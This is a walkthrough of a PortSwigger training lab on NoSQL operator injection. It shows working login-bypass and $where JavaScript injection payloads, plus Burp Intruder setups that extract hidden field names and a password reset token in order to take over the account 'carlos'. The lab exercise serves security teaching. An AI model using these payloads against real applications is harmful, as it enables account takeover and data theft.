# [Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

> extracting unknown reset password token field for user **carlos**

- open the lab in burp browser
- try to log in with **carlos** with any password
- will get a **Invalid username or password** error
- send the log in attempt to repeater

```
POST /login HTTP/2
...
{"username":"carlos","password":"qwe"}
```

- send the login request with `{ "$ne": "invalid" }`

```
POST /login HTTP/2
...
{ "username": "carlos", "password": { "$ne": "invalid" } }
```

- will receive a **Account locked** error
- this shows `$ne` has been accepted, the application is vulnerable
- this error message will show in the future if there is match too

> reset **carlos** password

- this is an important step, the NoSQL table only gonna have the password reset token if a password reset has been requested
- forgot password -> add the **carlos** username

> js injection test

- in the repeater send the request like this

```
POST /login HTTP/2
...
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

- will get a **Invalid username or password** error
- try like this then

```
POST /login HTTP/2
...
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
```

- will receive a **Account locked** error
- the `$where` is evaluated

> intruder extraction

- set the JSON with `"$where":"Object.keys(this)[0].match('^.{}.*')"`
- set the intruder to cluster bomb
- the request should look like this

```
POST /login HTTP/2
...
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[0].match('^.{§0§}§a§.*')"}
```

- the `§0§` should have a list of numbers from 0 to 20
- the `§a§` should have a list of **0-9**, **a-z** and **A-Z**
- start the cluster bomb

- the `Object.keys(this)[0]` will give back the **id**
- repeat the same cluster bomb for `"$where":"Object.keys(this)[1].match('^.{}.*')"`

```
POST /login HTTP/2
...
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{§0§}§a§.*')"}
```

- explore it from 0 to 4
- `0:id`; `2:username`; `3:password`; `4:<this is what we looking for>`
- the **4** is different for everyone in this case it is `resetPwdToken`

> test for the reset password token

- test the `GET /forgot-password` with the token

```
GET /forgot-password?resetPwdToken=a HTTP/2
```

- it will return an `Invalid token` error message
- this means that the token is not valid but the key is

> extract password reset token value

- go back to the intruder and the `"$where":"this.resetPwdToken.match('^.{}.*')"`

```
POST /login HTTP/2
...
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.resetPwdToken.match('^.{§0§}§a§.*')"}
```

- same setup with the characters
- this will extract the right value, in this cas it was `8f5fd6a5e059603d`
- it is different by labs

> reset **carlos** password

- in repeater send the `GET /forgot-password` with the token

```
GET /forgot-password?resetPwdToken=8f5fd6a5e059603d HTTP/2
```

- open it in browser
- give a new password
- login with `carlos:<new password>`
